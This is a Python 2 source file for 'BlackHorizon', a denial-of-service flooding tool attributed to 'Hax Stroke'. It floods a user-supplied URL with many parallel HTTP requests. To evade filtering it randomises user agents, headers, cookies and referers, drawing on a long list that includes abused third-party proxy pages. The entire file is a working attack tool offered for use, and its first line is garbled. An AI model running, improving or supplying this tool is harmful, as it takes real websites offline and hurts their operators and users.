#!/usr#!/usr/bin/env python
from multiprocessing import Process, Manager, Pool
import urlparse, ssl
import sys, getopt, random, time, datetime, os
import httplib
import platform
HTTPCLIENT = httplib
DEBUG = True
METHOD_GET  = 'GET'
METHOD_POST = 'POST'
METHOD_HEAD = 'HEAD'
METHOD_RAND = 'random'
DEFAULT_pipe=''
DEFAULT_SOCKETS=''
JOIN_TIMEOUT=0.1
BLACKHORIZON_BANNER = 'blackhorizon ddos by Hax Stroke for GSH members'
USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
            'details': [],
            'extensions': []
        }
    }
}

class BlackHorizon(object):
    counter = [0, 1]
    last_counter = [0, 0]
    pipeQueue = []                                 
    manager = []                                    
    useragents = []                                 
    url = None                                      
    # Options
    nr_pipe = DEFAULT_pipe
    nr_sockets = DEFAULT_SOCKETS
    method = ''

    def __init__(self, url):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list((0, 1))
    def exit(self):
        self.stats()
        print "Stopping BlackHorizon"
    def __del__(self):
        self.exit()
    def printHeader(self):
        print BLACKHORIZON_BANNER
        time.sleep(3)
    def fire(self):
        self.printHeader()
        print "Attacking Website with {1} pipes per attack and {2} connections per socket.".format(self.method, self.nr_pipe, self.nr_sockets)
        time.sleep(3)
        if DEBUG:
            print "Starting {0} concurrent pipes".format(self.nr_pipe)
        for i in range(int(self.nr_pipe)):
            try:
                pipe = Striker(self.url, self.nr_sockets, self.counter)
                pipe.useragents = self.useragents
                pipe.method = self.method
                self.pipeQueue.append(pipe)
                pipe.start()
            except (Exception):
                error("Failed to start pipes {0}".format(i))
                pass 
        if DEBUG:
            pass
        self.monitor()
    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print "#--------> pipe Online: {0} attacking... (Offline: {1}) Conection's online: {2} <--------#".format(self.counter[0], self.counter[1])
                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "\tpipe's can't attack more check if the website is offline."
                    print "\tUse the downforeveryoneorjustme.com for check."
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass # silently ignore
    def monitor(self):
        while len(self.pipeQueue) > 0:
            try:
                for pipe in self.pipeQueue:
                    if pipe is not None and pipe.is_alive():
                        pipe.join(JOIN_TIMEOUT)
                    else:
                        self.pipeQueue.remove(pipe)
                self.stats()
            except (KeyboardInterrupt, SystemExit):
                print "Removing all Horizon pipe's"
                for pipe in self.pipeQueue:
                    try:
                        if DEBUG:
                            print "Killing pipe {0}".format(pipe.name)
                        #pipe.terminate()
                        pipe.stop()
                    except Exception, ex:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass
class Striker(Process):
    # Counters
    request_count = 1
    failed_count = 0
    # Containers
    url = None
    host = None
    port = []
    ssl = []
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS
    # Flags
    runnable = True
    # Options
    method = ''
    def __init__(self, url, nr_sockets, counter):
        super(Striker, self).__init__()
        self.counter = counter
        self.nr_socks = nr_sockets
        parsedUrl = urlparse.urlparse(url)
        if parsedUrl.scheme == 'https':
            self.ssl = True
        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path
        self.port = parsedUrl.port
        if not self.port:
            self.port = 80 if not self.ssl else 443
        self.referers = [
            'http://isup.me/', 
            'https://html5.validator.nu/?doc=',     
            'https://downforeveryoneorjustme.com/',        
            'http://check-host.net/check-http?host=',
            'http://validator.w3.org/check?url=',
            'http://validator.w3.org/checklink?url=',
            'http://validator.w3.org/nu/?doc=',
            'http://forum.buffed.de/redirect.php?url=',
            'http://www.airberlin.com/site/redirect.php?url=',	
            'http://ruforum.mt5.com/redirect.php?url=',
            'http://validator.w3.org/check?url=',
            'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
            'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
            'https://drive.google.com/viewerng/viewer?url=',
            'http://www.google.com/translate?u=',
            'https://developers.google.com/speed/pagespeed/insights/?url=',
            'http://help.baidu.com/searchResult?keywords=',
            'http://www.bing.com/search?q=',
            'https://add.my.yahoo.com/rss?url=',
            'https://play.google.com/store/search?q=',
            'http://www.google.com/?q=',
            'http://regex.info/exif.cgi?url=',
            'http://anonymouse.org/cgi-bin/anon-www.cgi/',
            'http://www.google.com/translate?u=',
            'http://translate.google.com/translate?u=',
            'http://validator.w3.org/feed/check.cgi?url=',
            'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
            'http://validator.w3.org/check?uri=',
            'http://jigsaw.w3.org/css-validator/validator?uri=',
            'http://validator.w3.org/checklink?uri=',
            'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
            'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
            'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
            'http://validator.w3.org/mobile/check?docAddr=',
            'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
            'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
            'http://feedvalidator.org/check.cgi?url=',
            'http://gmodules.com/ig/creator?url=',
            'http://www.google.com/ig/adde?moduleurl=',
            'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
            'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
            'http://www.onlinewebcheck.com/check.php?url=',
            'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
            'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
            'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
            'http://browsershots.org;POST;browsershots.org.txt',
            'http://streamitwebseries.twww.tv/proxy.php?url=',
            'http://www.comicgeekspeak.com/proxy.php?url=',
            'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
            'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://web-sniffer.net/?url=',
            'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://translate.yandex.net/tr-url/ru-uk.uk/',
            'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
            'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
            'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=',
            'http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=',
            'http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
            'http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=',
            'http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
            'http://validator.w3.org/nu/?doc=',
            'http://www.netvibes.com/subscribe.php?url=',
            'http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=',
            'http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
            'http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
            'http://www.google.com/ig/add?feedurl=',
            'http://anonymouse.org/cgi-bin/anon-www.cgi/',
            'http://www.google.com/translate?u=',
            'http://translate.google.com/translate?u=',
            'http://validator.w3.org/feed/check.cgi?url=',
            'http://validator.w3.org/check?uri=',
            'http://jigsaw.w3.org/css-validator/validator?uri=',
            'http://validator.w3.org/checklink?uri=',
            'http://www.w3.org/services/tidy?docAddr=',
            'http://validator.w3.org/mobile/check?docAddr=',
            'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
            'http://validator.w3.org/p3p/20020128/policy.pl?uri=',
            'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
            'http://feedvalidator.org/check.cgi?url=',
            'http://gmodules.com/ig/creator?url=',
            'http://www.google.com/ig/adde?moduleurl=',
            'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
            'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
            'http://host-tracker.com/check_page/?furl=',
            'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
            'http://www.viewdns.info/ismysitedown/?domain=',
            'http://www.onlinewebcheck.com/check.php?url=',
            'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
            'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
            'http://streamitwebseries.twww.tv/proxy.php?url=',
            'http://www.comicgeekspeak.com/proxy.php?url=',
			
            ]
    def __del__(self):
        self.stop()
    #builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str
    
    def run(self):
        if DEBUG:
            print "Starting pipe {0}".format(self.name)
        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(c)
                for conn_req in self.socks:
                    (url, headers) = self.createPayload()
                    method = random.choice([METHOD_GET, METHOD_POST, METHOD_HEAD]) if self.method == METHOD_RAND else self.method
                    conn_req.request(method.upper(), url, None, headers)
                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.incCounter()
                self.closeConnections()
            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore
        if DEBUG:
            print "pipe {0} completed run. Sleeping...".format(self.name)
    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass # silently ignore
    def createPayload(self):
        req_url, headers = self.generateData()
        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]
        return (req_url, random_headers)
    def generateQueryString(self, ammount = 1):
        queryString = []
        for i in range(ammount):
            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)
        return '&'.join(queryString)
    def generateData(self):
        returnCode = 0
        param_joiner = "?"
        if len(self.url) == 0:
            self.url = '/'
        if self.url.count("?") > 0:
            param_joiner = "&"
        request_url = self.url
        http_headers = self.generateRandomHeaders()
        return (request_url, http_headers)
    def generateRequestUrl(self):
        return self.url 
    def getUserAgent(self):
        if self.useragents:
            return random.choice(self.useragents)
        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6
        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
        os_name = random.choice(os['name']) 
        sysinfo = os_name
        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]
        # GET Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']
            browser_string = random.choice(browser['name'])
            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
            sysinfo = "%s; %s" % (browser_string, sysinfo)
            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
        ua_string = "%s (%s)" % (mozilla_version, sysinfo)
        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
        return ua_string
    def generateRandomHeaders(self):
        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])
        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]
        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1,1000),
            'Host': self.host,
        }
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5,10))
            random_referer = random.choice(self.referers) 
            if random.randrange(2) == 0:
                random_referer = random_referer 
            http_headers['Referer'] = random_referer = self.url
        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
        return http_headers
    # Housekeeping
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()
    # Counter Functions
    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass
    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass
os.system('cls' if os.name == 'nt' else 'clear')
print time.strftime("%b %d %Y %H:%M:%S")
print 'Python Version: ', platform.python_version()
print 'Compiler: ', platform.python_compiler()
print 'Operating system: ', platform.platform()
print 'Initiating monitor'
print \
"""
            @@@@@@@@@
                 __\_\__
     ____________|_____|_____________
      \                            /
       \      O   O   O   O       /    
|^^^^^^^\________________________/^^|
i-----------------------------------I
| /$$                 /$$           |                    
|| $$                | $$           |
|| $$       /$$   /$$| $$ /$$$$$$$$||
|| $$      | $$  | $$| $$|____ /$$/ |
|| $$      | $$  | $$| $$   /$$$$/  |
|| $$      | $$  | $$| $$  /$$__/   |
|| $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$||
|>________/ \______/ |__/|________/ |
|     Laughing at your security     |
I-----------------------------------i
"""
def error(msg):
    sys.stderr.write(str(msg+"\n"))
    sys.exit(2)
	
def main():
    url = raw_input('URL: ')
    DEFAULT_pipe=input('Pipe strikers to use (10)? ')
    DEFAULT_SOCKETS=input('Sockets to use (10)? ')
    choice=''
    if choice=='1':
        method(METHOD_GET)
    elif choice=='2':
        method(METHOD_POST)
    elif choice=='3':
        method(METHOD_HEAD)
    elif choice=='4':
        method(METHOD_RAND)
    print '1) GET'
    time.sleep(0.5) #import time
    print '2) POST'
    time.sleep(0.5)
    print '3) HEAD'
    time.sleep(0.5)
    print '4) Random'
    time.sleep(0.5)
    choice=raw_input("1 - 4: ")
    if choice=='1':
        print 'Method is GET'
    elif choice=='2':
        print 'Method is POST'
    elif choice=='3':
        print 'Method is HEAD'
    elif choice=='4':
        print 'Method is Random'
    method = choice
    opts, args = getopt.getopt(sys.argv[2:], "dhc:s:m:u:", ["debug", "help", "pipe", "sockets", "method", "useragents" ])
    pipe = DEFAULT_pipe
    socks = DEFAULT_SOCKETS
    uas_file = None
    useragents = []
    time.sleep(2)
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-u", "--useragents"):
            uas_file = a
        elif o in ("-s", "--sockets"):
            socks = int(a)
        elif o in ("-c", "--pipe"):
            pipe = int(a)
        elif o in ("-d", "--debug"):
            global DEBUG
            DEBUG = True
        elif o in ("-m", "--method"):
            if a in (METHOD_GET, METHOD_POST, METHOD_HEAD, METHOD_RAND):
                method = a
            else:
                error("method {0} is invalid".format(a))
        else:
            error("option '"+o+"' doesn't exists")
    if uas_file:
        try:
            with open(uas_file) as f:
                useragents = f.readlines()
        except EnvironmentError:
                error("cannot read file {0}".format(uas_file))
    blackhorizon = BlackHorizon(url)
    blackhorizon.useragents = useragents
    blackhorizon.nr_pipe = pipe
    blackhorizon.method = method
    blackhorizon.nr_sockets = socks
    blackhorizon.fire()
	
if __name__ == "__main__":
    main()
